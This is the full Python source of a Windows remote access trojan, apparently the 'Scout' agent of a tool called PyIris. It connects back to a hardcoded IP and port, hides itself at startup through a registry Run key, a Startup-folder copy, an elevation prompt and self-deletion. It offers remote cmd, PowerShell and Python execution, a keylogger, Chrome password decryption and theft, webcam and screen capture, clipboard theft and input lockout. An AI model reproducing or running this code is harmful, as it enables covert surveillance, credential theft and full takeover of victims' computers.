import mss.tools
import sys
import ctypes
import win32clipboard
import pythoncom
import pyHook
import mss
import socket
import cv2
import _winreg
import sqlite3
import os
import threading
import pyautogui
import webbrowser
import pickle
from getpass import getuser
from PIL import Image
from win32gui import SystemParametersInfo
from platform import uname, win32_ver
from win32con import HKEY_CURRENT_USER, KEY_SET_VALUE, REG_SZ, SPI_SETDESKWALLPAPER
from pickle import dumps, loads
from StringIO import StringIO
from datetime import datetime
from urllib2 import urlopen, unquote
from comtypes import CLSCTX_ALL
from win32crypt import CryptUnprotectData
from sys import argv
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from subprocess import Popen, PIPE, check_output
from ctypes import Structure, windll, c_uint, sizeof, byref, windll
from io import BytesIO
from time import gmtime, strftime, sleep
from shutil import copy
from os import chdir, startfile, getcwd, path, path, remove, _exit, path, getcwd, getpid
from win32api import RegOpenKeyEx, RegSetValueEx

help_menu = '''
Scout Help Menu
===============
   Base Commands :
      disconnect                              Disconnects the scout
      help                                    Show the help menu or help for specific command, alias of the command is "?"
      kill                                    Kills the scout
      ping                                    Ping the scout
      sleep                                   Make the scout disconnect and sleep for a specified amount of time

   Scout Commands :
      active                                  Shows all open windows on the target system
      admin                                   Checks to see if the scout is running as a process with admin privileges
      browse <site>                           Opens a new browser to the specified site
      chromedump ["active"|"passive"]         Dumps chrome passwords. If "active" kills chrome.exe first, if "passive" will not run if chrome.exe is running
      clip_clear                              Clear the clipboard data on the target system
      clip_dump                               Display contents of clipboard on the target system
      clip_set <text to set clipboard to>     Set the value of the clipboard on the target system
      download <Remote file path>             Remotely download a file to local current working directory of PyIris
      download_web <url> <Remote file path>   Allows you to download a file from a url supplied to a specified remote file path
      exec_c <shell command>                  A remote shell command execution component of the scout, it allows the scout to remotely execute commands using cmd
      exec_f <Remote file path>               Will open and execute any file that is specified as the argument
      exec_p <shell command>                  A remote shell command execution component of the scout, it allows the scout to remotely execute commands using powershell
      exec_py <python command>                Execute in-memory arbitrary python code on the target system
      exec_py_file <Local file path>          Execute arbitrary python code from a file to execute on the target system in-memory
      exec_py_script                          Script in the terminal a block of in-memory arbitrary python code to execute on the target system
      idle                                    Get amount of time user has not pressed a key or moved mouse/ get the idle time of system
      inj_h <hotkey combination to inject>    Inject a hotkey combination through keystrokes that mimic button presses
      inj_p <button to inject as a press>     Inject a single key press through keystrokes that mimic button presses
      inj_t <string to inject as typing>      Inject a string through keystrokes that mimic typing
      inj_valid                               List all the valid keys the user can inject into the victim
      inter_lock <key/mouse>                  Disable the keyboard or mouse interface
      inter_unlock <key/mouse>                Enable the keyboard or mouse interface
      key_dump                                Dump the captured in-memory keystrokes
      key_start                               Start the keylogger
      key_stop                                Stop the keylogger
      lock                                    Allows you to gracefully lock the target system
      logout                                  Allows you to gracefully log the user out of the target system
      reg_persist                             This module creates a new key in the HKCU\Software\Microsoft\Windows\CurrentVersion\Run registry path
      restart                                 Allows you to gracefully restart the target system
      screen                                  Takes a screenshot and saves it to in memory file before sending the in memory file to PyIris to download
      set_audio <number>                      Set system wide audio level by decibel
      shutdown                                Allows you to gracefully shutdown the target system
      startup_persist                         This module copies the scout to the windows startup folder
      sysinfo                                 Grabs system info and displays it
      upload <Local file path>                Remotely upload a file to remote current working directory of scout
      wallpaper <Remote path of picture>      Set the targets wallpaper to a specified image file on the remote system
      webcam                                  Snaps a picture from the webcam and saves it as an in memory pickle before sending it to PyIris to decode and download
'''
window = ""
keylog = ""
active_logger = False
mouselock = False
keylock = False

def active():
    global IsWindowVisible
    EnumWindows = ctypes.windll.user32.EnumWindows
    EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_int), ctypes.POINTER(ctypes.c_int))
    GetWindowText = ctypes.windll.user32.GetWindowTextW
    GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
    IsWindowVisible = ctypes.windll.user32.IsWindowVisible
    titles = []
    def foreach_window(hwnd, lParam):
        if IsWindowVisible(hwnd):
            length = GetWindowTextLength(hwnd)
            buff = ctypes.create_unicode_buffer(length + 1)
            GetWindowText(hwnd, buff, length + 1)
            titles.append(buff.value)
        return True
    EnumWindows(EnumWindowsProc(foreach_window), 0)    
    encoded = ['\n   - ' + i.encode('ascii','ignore').strip() for i in titles]
    encoded = filter(lambda a: a != '\n   - ', encoded)
    encoded = list(set(encoded))
    data = '[+]All opened windows : \n'
    data += ''.join(encoded)
    s.sendall(data + '\n')

def disable(event):
    return False


def enable(event):
    return True


def key_lock():
    hm = pyHook.HookManager()
    hm.KeyAll = disable
    hm.HookKeyboard()
    while True:
        if not keylock:
            hm = pyHook.HookManager()
            hm.KeyAll = enable
            hm.HookKeyboard()
            return
        pythoncom.PumpWaitingMessages()


def mouse_lock():
    hm = pyHook.HookManager()
    hm.MouseAll = disable
    hm.HookMouse()
    while True:
        if not mouselock:
            hm = pyHook.HookManager()
            hm.MouseAll = enable
            hm.HookMouse()
            return
        pythoncom.PumpWaitingMessages()


def interface_locker(data):
    global keylock
    global mouselock
    if data.split(' ')[0] == 'inter_lock' and data.split(' ')[1] == 'key' and keylock:
        s.sendall('[-]Keyboard is already locked')
    elif data.split(' ')[0] == 'inter_lock' and data.split(' ')[1] == 'mouse' and mouselock:
        s.sendall('[-]Mouse is already locked')
    elif data.split(' ')[0] == 'inter_lock' and data.split(' ')[1] == 'key':
        keylock = True
        t = threading.Thread(target=key_lock,args=(),)
        t.start()
        s.sendall('[+]Locked keyboard interface')
    elif data.split(' ')[0] == 'inter_lock' and data.split(' ')[1] == 'mouse':
        mouselock = True
        t = threading.Thread(target=mouse_lock,args=(),)
        t.start()
        s.sendall('[+]Locked mouse interface')
    elif data.split(' ')[0] == 'inter_unlock' and data.split(' ')[1] == 'key':
        keylock = False
        s.sendall('[+]Unlocked keyboard interface')
    elif data.split(' ')[0] == 'inter_unlock' and data.split(' ')[1] == 'mouse':
        mouselock = False
        s.sendall('[+]Unlocked mouse interface')
    else:
        s.sendall('[-]Please specify valid interface, key/mouse, to lock/unlock')

def upload():    
    pickled_data = recv_all(s)
    data = loads(pickled_data)
    filename = data[0]
    f = open(filename,'wb')
    f.write(data[1])
    s.sendall('[+]Successfully uploaded file')

def registry_persist_startup(path):
    reg = _winreg.ConnectRegistry(None,_winreg.HKEY_CURRENT_USER)
    key = _winreg.CreateKeyEx(reg,'Software\Microsoft\Windows\CurrentVersion\Run',0,_winreg.KEY_WRITE)
    _winreg.SetValueEx(key, 'Updater',0,_winreg.REG_SZ, path)
    _winreg.FlushKey(key)
    _winreg.CloseKey(key)
    _winreg.CloseKey(reg)


def webcam():
    cam = cv2.VideoCapture(0)
    retval, im = cam.read()
    cam.release()
    cv2.destroyAllWindows()
    im = cv2.cvtColor(im, cv2.COLOR_BGR2RGB)
    return im

def exec_p(execute):
    execute = execute.split(' ',1)[1]
    if execute[:3] == 'cd ':
        execute = execute.replace('cd ', '', 1)
        chdir(execute)
        s.sendall("[+]Changed to directory : " + execute)
    else:
        result = Popen('powershell.exe ' + execute, shell=True, stdout=PIPE, stderr=PIPE,
                       stdin=PIPE)
        result = result.stdout.read() + result.stderr.read() 
        s.sendall('[+]Command output : \n' + result)

def download(data):
    filepath = data.split(' ',1)[1]
    f = open(filepath,'rb')
    file_data = f.read()
    pickled_data = dumps([filepath,file_data])
    s.sendall(pickled_data)

def browse(site):
    site = site.split(' ',1)[1]
    open_bool = webbrowser.open(site)
    if open_bool:
        s.sendall('[+]Opened site : ' + site)
    else:
        s.sendall('[-]Could not open site : ' + site)

def registry_persist(path):
    reg = _winreg.ConnectRegistry(None,_winreg.HKEY_CURRENT_USER)
    key = _winreg.CreateKeyEx(reg,'Software\Microsoft\Windows\CurrentVersion\Run',0,_winreg.KEY_WRITE)
    _winreg.SetValueEx(key, 'Updater',0,_winreg.REG_SZ, path)
    _winreg.FlushKey(key)
    _winreg.CloseKey(key)
    _winreg.CloseKey(reg)
    s.sendall('[+]Persistence via registry achieved')

def self_delete_startup():
    remove(path.abspath(argv[0]))


def exec_f(file):
    startfile(file.split(' ',1)[1])
    s.sendall('[+]Executed : ' + file.split(' ',1)[1])

def exec_c(execute):
    execute = execute.split(' ',1)[1]
    if execute[:3] == 'cd ':
        execute = execute.replace('cd ', '', 1)
        chdir(execute)
        s.sendall("[+]Changed to directory : " + execute)
    else:
        result = Popen(execute, shell=True, stdout=PIPE, stderr=PIPE,
                       stdin=PIPE)
        result = result.stdout.read() + result.stderr.read()        
        s.sendall('[+]Command output : \n' + result)
   
def download_web(command):
    url = command.split(' ')[1]
    file_name = command.split(' ')[2]
    response = urlopen(url)
    url_data = response.read()
    f = open(file_name, 'wb')
    f.write(url_data)
    f.close()
    s.sendall('[+]Downloaded : ' + url + ' -> ' + file_name)

def exec_py(command):
    command = command.split(' ', 1)[1]
    old_stdout = sys.stdout
    result = StringIO()
    sys.stdout = result
    try:
        exec(command)
    except Exception as e:
        result.write(str(e) + '\n')
    sys.stdout = old_stdout
    result_string = result.getvalue()
    s.sendall('[*]Result of code : \n\n' + result_string)


def chromedump(arg):
    arg = arg.split(' ', 1)[1]
    msg = ''
    if arg == 'active':
        os.system('taskkill /f /im chrome.exe')
        msg += '[+]Killed chrome process'
    elif arg == 'passive':
        if 'chrome.exe' in check_output(['tasklist']):
            s.sendall('[-]Chrome is currently running, this module will not do anything until chrome stops')
            return
    else:
        raise IndexError
        return
    info_list = []
    connection = sqlite3.connect(os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\' + 'Login Data')
    with connection:
        cursor = connection.cursor()
        v = cursor.execute(
            'SELECT action_url, username_value, password_value FROM logins')
        value = v.fetchall()
    for origin_url, username, password in value:    
        password = CryptUnprotectData(
            password, None, None, None, 0)[1]
        if password:
            info_list.append({
                'origin_url': origin_url,
                'username': username,
                'password': str(password)
            })
    msg += '\n[*]Dumped passwords : '
    if not info_list:
        msg += '\n[-]No passwords present'
    else:
        for i in info_list:
            msg += '\n   [+]Username : ' + i['username'].encode('ascii','ignore')
            msg += '\n      URL      : ' + i['origin_url'].encode('ascii','ignore')
            msg += '\n      Password : ' + i['password'].encode('ascii','ignore')
    s.sendall(msg)

def clip_logger(option):
    flag = option.split(' ',1)
    if flag[0] == 'clip_dump':
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        s.sendall('[+]Got clipboard data : \n' + data)
    elif flag[0] == 'clip_set':
        win32clipboard.OpenClipboard()
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardText(flag[1])
        win32clipboard.CloseClipboard()
        s.sendall('[+]Set clipboard text to : ' + flag[1])
    elif flag[0] == 'clip_clear':
        win32clipboard.OpenClipboard()
        win32clipboard.EmptyClipboard()
        win32clipboard.CloseClipboard()
        s.sendall('[+]Cleared clipboard')

def set_audio(data):
    number = data.split(' ',1)[1]
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    range_vol = volume.GetVolumeRange()
    volume.SetMasterVolumeLevel(float(number), None)
    data = ''
    data += '[*]Max decibel level(100%) : ' + str(range_vol[1])
    data += '\n[*]Minimum decibel level(0%) : ' + str(range_vol[0])
    data += '\n[+]Set volume to : ' + str(number)
    s.sendall(data)

def sysinfo():
    platform_uname = uname()
    platform_win32 = win32_ver()
    private_ips = [str(i[4][0]) for i in socket.getaddrinfo(socket.gethostname(), None)]
    data = '[*]System Information : \n'
    data += '   OS             : ' + str(platform_uname[0]) + '\n'
    data += '   Release        : ' + str(platform_uname[2]) + '\n'
    data += '   Exact Version  : ' + str(platform_uname[3]) + '\n'
    data += '   Node Name      : ' + str(platform_uname[1]) + '\n'
    data += '   Machine Type   : ' + str(platform_uname[4]) + '\n'
    data += '   Processor Type : ' + str(platform_uname[5]) + '\n'
    data += '   OS Type        : ' + str(platform_win32[3]) + '\n'
    data += '   Private IPs    : ' + ', '.join(private_ips) + '\n'
    data += '   Process ID     : ' + str(getpid()) + '\n'
    data += '   System time    : ' + str(datetime.now().strftime('%Y-%m-%d %H:%M:%S')) + '\n'
    data += '   Timezone       : ' + str(strftime("%z", gmtime())) + '\n'
    s.sendall(data)

def system_stat(option):
    if option == 'lock':
        s.sendall('[*]Locking user...')
        windll.user32.LockWorkStation()
    elif option == 'logout':
        s.sendall('[*]Logging user out...')
        os.system('shutdown /l')
    elif option == 'restart':
        s.sendall('[*]System restarting...')
        os.system('shutdown /r /t 0')
    elif option == 'shutdown':
        s.sendall('[*]System shutting down...')
        os.system('shutdown /s /t 0')

def admin():
    s.sendall('[*]Scout is running with admin privileges : ' + str(windll.shell32.IsUserAnAdmin() != 0))

def inject_keystokes(args):
    command = args.split(' ',1)[0]
    injecting = args.split(' ',1)[1]
    if command == "inj_t":
        pyautogui.typewrite(injecting)
        s.sendall('[+]Injected keystrokes : ' + injecting)
    elif command == "inj_h":
        injecting = injecting.split(' ')
        for i in injecting:
            pyautogui.keyDown(i)
        for i in reversed(injecting):
            pyautogui.keyUp(i)
        s.sendall('[+]Injected hotkeys : ' + ' '.join(injecting))
    elif command == "inj_p":
        pyautogui.press(injecting)
        s.sendall('[+]Injected button press : ' + injecting)


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def req_admin_startup():
    if is_admin():
        return
    else:
        ctypes.windll.shell32.ShellExecuteW(None, u"runas", unicode(sys.executable), unicode(__file__), None, 1)
        os._exit(1)


def startup_persist_startup(filepath):
        copy(filepath, 'C:\\Users\\' + getuser() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + path.basename(argv[0]))


def startup_persist(filepath):
        copy(filepath, 'C:\\Users\\' + getuser() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + path.basename(argv[0]))
        s.sendall('[+]Persistence via startup folder achieved')

def wallpaper(data):
    path = data.split(' ',1)[1]
    exec("path = r'" + path + "'")
    key = RegOpenKeyEx(HKEY_CURRENT_USER,"Control Panel\Desktop",0,KEY_SET_VALUE)
    RegSetValueEx(key, "WallpaperStyle", 0, REG_SZ, "0")
    RegSetValueEx(key, "CenterWallpaper", 0, REG_SZ, "0")
    SystemParametersInfo(SPI_SETDESKWALLPAPER, path, 1+2)
    s.sendall('[+]Set wallpaper to : ' + path)


def OnKeyboardEvent(event):
    global window
    global keylog
    sample_space = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890'
    try:
        letter = event.Key
        if event.WindowName != window:
            keylog += '\n\n<User started typing in new window : ' + event.WindowName + '>\n\n'
            window = event.WindowName
        if letter not in sample_space:
            keylog += '[' + letter + ']'
        else:
            keylog += letter
    except:
        keylog += '[Error Logging Key!]'
    return True

def key(option):
    global active_logger
    global keylog
    if option == 'key_start':
        if active_logger:
            s.sendall('[-]Keylogger already started')
        else:
            hooks_manager = pyHook.HookManager()
            hooks_manager.KeyDown = OnKeyboardEvent
            hooks_manager.HookKeyboard()
            active_logger = not active_logger
            s.sendall('[+]Activated keylogger')
            while True:
                if not active_logger:
                    hooks_manager.UnhookKeyboard()
                    windll.user32.PostQuitMessage(0)
                    return
                else:
                    pythoncom.PumpWaitingMessages()
    elif option == 'key_stop':
        if not active_logger:
            s.sendall('[-]Keylogger not started')
        else:
            active_logger = not active_logger
            s.sendall('[+]Stopped keylogger')
    elif option == 'key_dump':
        s.sendall('[+]Keylog dump : \n' + keylog + '\n')
        keylog = ""

class LASTINPUTINFO(Structure):
    _fields_ = [
        ('cbSize', c_uint),
        ('dwTime', c_uint),
    ]

def idle(data):
    lastInputInfo = LASTINPUTINFO()
    lastInputInfo.cbSize = sizeof(lastInputInfo)
    windll.user32.GetLastInputInfo(byref(lastInputInfo))
    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
    s.sendall('[+]User has been inactive for : ' + str(millis / 1000.0))

def screen():
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        im = sct.grab(monitor)
        raw_bytes = mss.tools.to_png(im.rgb, im.size)
        s.sendall(raw_bytes)
registry_persist_startup(path.join(getcwd(),path.abspath(argv[0])))
req_admin_startup()
startup_persist_startup(path.join(getcwd(),path.abspath(argv[0])))
self_delete_startup()

def recv_all(sock):
    sock.settimeout(None)
    data = sock.recv(999999)
    sock.settimeout(2)
    while True:
        try:
            tmp_data = sock.recv(999999)
            if not tmp_data:
                raise socket.error
            data += tmp_data
        except (socket.error, socket.timeout):
            return data

while True:
    while True:
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect(('192.168.1.114',9999))
            s.sendall('Xr21mvuZ)zR9W%gobo7xpaZG@Azy#XTyF#HlvixpmblDWEpHvP')
            break
        except (socket.timeout,socket.error):
            continue
    while True:
        try:
            data = recv_all(s)
            command = data.split(' ',1)[0]
            if command == 'kill':
                s.sendall('[*]Scout is killing itself...')
                _exit(1)
            elif command in ('help','?'):
                s.sendall(help_menu)
            elif command == 'ping':
                s.sendall('[+]Scout is alive')
            elif command == 'sleep':
                length = int(data.split(' ',1)[1])
                s.sendall('[*]Scout is sleeping...')
                for i in range(length):
                    sleep(1)
                break
            elif command == 'disconnect':
                s.sendall('[*]Scout is disconnecting itself...')
                sleep(3)
                break
            elif command == "download_web":
                download_web(data)
            elif command == "idle":
                idle(data)
            elif command == "sysinfo":
                sysinfo()
            elif command in ('inter_lock','inter_unlock'):
                interface_locker(data)
                
            elif command in ('lock','logout','restart','shutdown'):
                system_stat(command)
            elif command == "active":
                active()
            elif command == "admin":
                admin()
            elif command == "browse":
                browse(data)
            elif command == "exec_p":
                exec_p(data)
            elif command == "chromedump":
                chromedump(data)
            elif command == "exec_c":
                exec_c(data)
            elif command == "screen":
                screen()
            elif command == "exec_f":
                exec_f(data)
            elif command in ('key_start','key_stop','key_dump'):
                t = threading.Thread(target=key, args=(data,))
                t.start()
            elif command == "set_audio":
                set_audio(data)
            elif command in ("inj_t","inj_h","inj_p"):
                inject_keystokes(data)
            elif command == "upload":
                upload()
            elif command == "startup_persist":
                startup_persist(path.join(getcwd(),path.abspath(argv[0])))
            elif command == "wallpaper":
                wallpaper(data)
            elif command in ('clip_dump', 'clip_set', 'clip_clear'):
                clip_logger(data)
            elif command == 'webcam':
                s.sendall(pickle.dumps(Image.fromarray(webcam())))
            elif command == "download":
                download(data)
            elif command == "exec_py":
                exec_py(data)
            elif command == "reg_persist":
                registry_persist(path.join(getcwd(),path.abspath(argv[0])))
            else:
                s.sendall('[-]Scout does not have the capability to run this command. (Was it loaded during generation?)')
        except (socket.error,socket.timeout):
            s.close()
            break
        except IndexError:
            s.sendall('[-]Please supply valid arguments for the command you are running')
        except Exception as e:
            s.sendall('[!]Error in scout : ' + str(e))
